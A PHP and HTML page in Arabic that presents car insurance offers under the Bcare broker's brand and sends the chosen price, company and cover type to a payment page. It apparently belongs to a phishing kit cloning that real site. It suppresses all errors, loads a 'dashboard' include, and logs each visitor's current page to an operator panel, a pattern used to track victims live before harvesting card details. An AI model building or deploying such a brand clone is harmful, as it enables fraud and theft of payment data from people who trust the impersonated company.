<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'أنواع التأمين');
}

if (isset($_POST['submit'])) {
    $_SESSION['totalprice'] = $_POST['totalprice'];
    $_SESSION['image'] = $_POST['image'];
    $_SESSION['insurance_type'] = $_POST['insurance_type'];
    $_SESSION['company_name'] = $_POST['company_name'];
    $_SESSION['date'] = date('Y-m-d'); // تعيين تاريخ اليوم تلقائياً
    echo "<script>document.location.href='payment.php';</script>";
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اختر نوع التأمين | بي كير</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --color-primary: #0F4C72;
            --color-primary-dark: #0a3654;
            --color-primary-light: #E8F4F8;
            --color-accent: #F2A340;
            --color-accent-dark: #e8951a;
            --color-background: #F4F7FB;
            --color-text-primary: #1E293B;
            --color-text-secondary: #64748B;
            --color-border: #E2E8F0;
            --shadow-soft: 0 16px 40px rgba(15, 76, 114, 0.12);
            --shadow-card: 0 14px 30px rgba(15, 76, 114, 0.16);
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Cairo", sans-serif;
            direction: rtl;
        }

        body {
            background: linear-gradient(135deg, var(--color-background) 0%, #ffffff 100%);
            color: var(--color-text-primary);
            min-height: 100vh;
        }

        /* Navbar */
        .navbar {
            background: white;
            padding: 1rem 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
            margin-bottom: 0;
        }

        /* Hero Section */
        .hero-section {
            background: linear-gradient(135deg, var(--color-primary) 0%, var(--color-primary-dark) 100%);
            padding: 3rem 0;
            position: relative;
            overflow: hidden;
        }

        .hero-section::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -10%;
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(242, 163, 64, 0.15) 0%, transparent 70%);
            border-radius: 50%;
            animation: float-soft 8s ease-in-out infinite;
        }

        .hero-section::after {
            content: '';
            position: absolute;
            bottom: -30%;
            left: -5%;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
            border-radius: 50%;
            animation: float-soft 10s ease-in-out infinite reverse;
        }

        @keyframes float-soft {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(-20px, -20px); }
        }

        .hero-content {
            position: relative;
            z-index: 2;
            text-align: center;
        }

        .hero-title {
            font-size: 1.75rem;
            font-weight: 900;
            color: white;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 0.938rem;
            color: rgba(255, 255, 255, 0.9);
        }

        /* Type Tabs */
        .type-tabs-container {
            padding: 2rem 0;
        }

        .type-tabs {
            background: white;
            padding: 0.625rem;
            border-radius: 1rem;
            display: flex;
            gap: 0.5rem;
            box-shadow: var(--shadow-soft);
            border: 1px solid var(--color-border);
        }

        .type-tab {
            flex: 1;
            padding: 1rem;
            border-radius: 0.75rem;
            text-align: center;
            cursor: pointer;
            font-weight: 700;
            font-size: 0.938rem;
            transition: all 0.3s;
            color: var(--color-text-secondary);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            border: 2px solid transparent;
        }

        .type-tab:hover:not(.active) {
            background: var(--color-primary-light);
            color: var(--color-primary);
        }

        .type-tab.active {
            background: var(--color-primary);
            color: white;
            border-color: var(--color-primary);
            box-shadow: 0 4px 12px rgba(15, 76, 114, 0.3);
        }

        .type-tab img {
            width: 1.5rem;
            height: 1.5rem;
            filter: grayscale(1);
            opacity: 0.6;
            transition: all 0.3s;
        }

        .type-tab.active img,
        .type-tab:hover img {
            filter: grayscale(0);
            opacity: 1;
        }

        /* Offers Container */
        .offers-section {
            padding: 1rem 0 3rem;
        }

        .offer-card {
            background: white;
            border-radius: 1.5rem;
            margin-bottom: 2rem;
            overflow: hidden;
            border: 1px solid var(--color-border);
            box-shadow: var(--shadow-card);
            transition: all 0.3s;
        }

        .offer-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(15, 76, 114, 0.2);
        }

        .offer-header {
            padding: 1.5rem;
            background: #FAFBFC;
            border-bottom: 1px solid var(--color-border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .offer-header img {
            height: 45px;
            object-fit: contain;
        }

        .company-badge {
            background: var(--color-primary-light);
            color: var(--color-primary);
            padding: 0.5rem 1rem;
            border-radius: 2rem;
            font-weight: 700;
            font-size: 0.813rem;
        }

        .offer-body {
            padding: 1.5rem;
        }

        .benefits-title {
            font-size: 1rem;
            font-weight: 700;
            color: var(--color-primary);
            margin-bottom: 1.25rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding-bottom: 0.75rem;
            border-bottom: 2px solid var(--color-border);
        }

        .benefits-title i {
            color: var(--color-accent);
            font-size: 1.25rem;
        }

        .benefits-list {
            background: var(--color-background);
            border-radius: 0.75rem;
            padding: 1rem;
        }

        .benefit-item {
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
            margin-bottom: 0.875rem;
            padding: 1rem;
            background: white;
            border-radius: 0.5rem;
            border: 1px solid var(--color-border);
            transition: all 0.3s;
        }

        .benefit-item:hover {
            border-color: var(--color-primary);
            box-shadow: 0 2px 8px rgba(15, 76, 114, 0.1);
        }

        .benefit-item:last-child {
            margin-bottom: 0;
        }

        .benefit-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .benefit-label {
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--color-text-primary);
            line-height: 1.4;
        }

        .benefit-price {
            font-size: 0.875rem;
            font-weight: 700;
            color: var(--color-text-secondary);
            white-space: nowrap;
            padding: 0.375rem 0.75rem;
            background: var(--color-background);
            border-radius: 0.375rem;
        }

        .benefit-price.included {
            color: #10B981;
            background: #ECFDF5;
        }

        .form-check {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .form-check-input {
            width: 1.25rem;
            height: 1.25rem;
            accent-color: var(--color-primary);
            cursor: pointer;
            flex-shrink: 0;
            border: 2px solid var(--color-border);
        }

        .form-check-input:checked {
            background-color: var(--color-primary);
            border-color: var(--color-primary);
        }

        .form-check-label {
            font-size: 0.813rem;
            font-weight: 500;
            color: var(--color-text-secondary);
            cursor: pointer;
        }

        .offer-footer {
            padding: 1.25rem 1.5rem;
            background: var(--color-background);
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 1.5rem;
        }

        .price-tag {
            text-align: left;
        }

        .price-label {
            font-size: 0.75rem;
            color: var(--color-text-secondary);
            font-weight: 600;
            text-align: right;
            margin-bottom: 0.25rem;
        }

        .price-val {
            font-size: 1.75rem;
            font-weight: 900;
            color: var(--color-primary);
        }

        .price-currency {
            font-size: 1rem;
            font-weight: 700;
        }

        .btn-buy {
            background: var(--color-accent);
            color: white;
            border-radius: 0.75rem;
            padding: 0.875rem 2rem;
            font-weight: 700;
            font-size: 1rem;
            text-decoration: none;
            border: none;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            cursor: pointer;
            white-space: nowrap;
        }

        .btn-buy:hover {
            background: var(--color-accent-dark);
            box-shadow: 0 8px 20px rgba(242, 163, 64, 0.3);
            transform: translateY(-2px);
        }

        /* Footer */
        footer {
            background: var(--color-primary);
            color: white;
            padding: 2.5rem 0;
            margin-top: 3rem;
            text-align: center;
        }

        footer img {
            height: 40px;
            margin-bottom: 1.5rem;
        }

        footer p {
            font-size: 0.813rem;
            opacity: 0.8;
            margin: 0;
        }

        /* Responsive */
        @media (min-width: 640px) {
            .hero-title {
                font-size: 2rem;
            }

            .type-tab {
                padding: 1.25rem;
                font-size: 1rem;
            }

            .offer-header {
                padding: 2rem;
            }

            .offer-body {
                padding: 2rem;
            }
        }

        @media (min-width: 1024px) {
            .hero-title {
                font-size: 2.25rem;
            }
        }

        @media (max-width: 576px) {
            .type-tab {
                flex-direction: column;
                gap: 0.25rem;
                font-size: 0.813rem;
                padding: 0.75rem 0.5rem;
            }

            .type-tab img {
                width: 1.25rem;
                height: 1.25rem;
            }

            .price-val {
                font-size: 1.5rem;
            }

            .btn-buy {
                padding: 0.75rem 1.5rem;
                font-size: 0.938rem;
            }
        }
    </style>
</head>

<body>

    <!-- Navbar -->
    <nav class="navbar">
        <div class="container text-center">
            <a href="index.php">
                <img src="./assets/Bcare-logo.svg" alt="Bcare" height="40">
            </a>
        </div>
    </nav>

    <!-- Hero Section -->
    <div class="hero-section">
        <div class="container">
            <div class="hero-content">
                <h1 class="hero-title">اختر نوع التأمين المناسب</h1>
                <p class="hero-subtitle">قارن واختر أفضل العروض من شركات التأمين المعتمدة</p>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <main class="container">
        
        <!-- Type Tabs -->
        <div class="type-tabs-container">
            <div class="type-tabs">
                <div class="type-tab active" data-type-name="ضد الغير" onclick="switchType(1, this)">
                    <img src="./assets/q-icon-3.svg">
                    <span>ضد الغير</span>
                </div>
                <div class="type-tab" data-type-name="تأمين مميز" onclick="switchType(2, this)">
                    <img src="./assets/car-crash-plus.svg">
                    <span>مميز</span>
                </div>
                <div class="type-tab" data-type-name="تأمين شامل" onclick="switchType(3, this)">
                    <img src="./assets/q-icon-2.svg">
                    <span>شامل</span>
                </div>
            </div>
        </div>

        <!-- Offers Section -->
        <div class="offers-section">
            <div id="offersContainer" class="row">
                <!-- Dynamically populated -->
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer>
        <div class="container">
            <img src="./assets/logo-bacre-white.svg" alt="Bcare">
            <p>جميع الحقوق محفوظة © 2025 شركة عناية الوسيط لوساطة التأمين</p>
        </div>
    </footer>

    <script>
        let currentInsuranceType = 'ضد الغير'; // متغير عام لحفظ نوع التأمين الحالي

        function switchType(id, el) {
            document.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
            el.classList.add('active');
            
            // حفظ نوع التأمين الحالي
            currentInsuranceType = el.getAttribute('data-type-name');
            
            renderOffers(id);
        }

        async function renderOffers(typeId) {
            try {
                const res = await fetch('data.json');
                const data = await res.json();
                const container = document.getElementById('offersContainer');
                container.innerHTML = '';

                const category = data.find(c => c.id == typeId);
                category.data.forEach(item => {
                    const html = `
                        <div class="col-lg-6">
                            <div class="offer-card">
                                <div class="offer-header">
                                    <img src="./assets/${item.img}" alt="Company">
                                    <span class="company-badge">${item.title}</span>
                                </div>
                                <div class="offer-body">
                                    <h6 class="benefits-title">
                                        <i class="bi bi-plus-circle-fill"></i>
                                        المنافع الإضافية
                                    </h6>
                                    <div class="benefits-list">
                                        ${item.extra.map(ex => `
                                            <div class="benefit-item">
                                                <div class="benefit-header">
                                                    <div class="benefit-label">${ex.title}</div>
                                                    <span class="benefit-price ${!ex.price ? 'included' : ''}">${ex.price ? ex.price + ' ريال' : 'مشمولة'}</span>
                                                </div>
                                                <div class="form-check">
                                                    <input class="form-check-input" type="checkbox" id="benefit_${item.id}_${ex.title}" ${ex.clicked ? 'checked disabled' : ''} onchange="recalculate(${item.id}, ${ex.price || 0}, this)">
                                                </div>
                                            </div>
                                        `).join('')}
                                    </div>
                                </div>
                                <div class="offer-footer">
                                    <div class="price-tag">
                                        <div class="price-label">الإجمالي شامل الضريبة</div>
                                        <div class="price-val" id="priceDisplay_${item.id}">
                                            ${item.totalprice} 
                                            <span class="price-currency">ريال</span>
                                        </div>
                                    </div>
                                    <form action="" method="POST">
                                        <input type="hidden" name="totalprice" id="priceInput_${item.id}" value="${item.totalprice}">
                                        <input type="hidden" name="image" value="${item.img}">
                                        <input type="hidden" name="insurance_type" id="insuranceType_${item.id}" value="${currentInsuranceType}">
                                        <input type="hidden" name="company_name" value="${item.title}">
                                        <button type="submit" name="submit" class="btn-buy">
                                            اشتري الآن 
                                            <i class="bi bi-chevron-left"></i>
                                        </button>
                                    </form>
                                </div>
                            </div>
                        </div>
                    `;
                    container.insertAdjacentHTML('beforeend', html);
                    
                    // تحديث قيمة نوع التأمين في الحقل المخفي بعد إضافة العنصر
                    setTimeout(() => {
                        const insuranceTypeInput = document.getElementById('insuranceType_' + item.id);
                        if (insuranceTypeInput) {
                            insuranceTypeInput.value = currentInsuranceType;
                        }
                    }, 10);
                });
            } catch (e) { console.error(e); }
        }

        function recalculate(itemId, price, checkbox) {
            const input = document.getElementById('priceInput_' + itemId);
            const display = document.getElementById('priceDisplay_' + itemId);
            let total = parseFloat(input.value);
            if (checkbox.checked) total += price;
            else total -= price;
            input.value = total.toFixed(2);
            display.innerHTML = `${total.toFixed(2)} <span class="price-currency">ريال</span>`;
        }

        document.addEventListener('DOMContentLoaded', () => renderOffers(1));
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>